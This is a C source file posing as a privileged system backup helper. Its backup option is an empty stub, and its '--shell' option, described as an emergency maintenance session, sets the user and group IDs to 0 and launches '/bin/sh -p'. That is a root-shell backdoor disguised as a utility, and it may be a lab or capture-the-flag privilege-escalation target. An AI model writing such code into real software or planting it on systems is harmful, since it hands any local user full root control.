#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Aegis System Backup Helper v1.2 (Privileged Mode)\n");
        printf("Usage: sysbackup_tool [OPTIONS]\n");
        printf("  --backup <dir>   Archiver un dossier systeme\n");
        printf("  --shell          Lancer une session de maintenance d'urgence\n");
        return 1;
    }

    if (strcmp(argv[1], "--shell") == 0) {
        printf("[+] Activation de la session d'urgence privileged root (EUID=0)...\n");
        setuid(0);
        setgid(0);
        char *shell_args[] = {"/bin/sh", "-p", NULL};
        execve("/bin/sh", shell_args, NULL);
    } else if (strcmp(argv[1], "--backup") == 0) {
        printf("[+] Archivage en cours...\n");
    } else {
        printf("[-] Option inconnue.\n");
    }

    return 0;
}
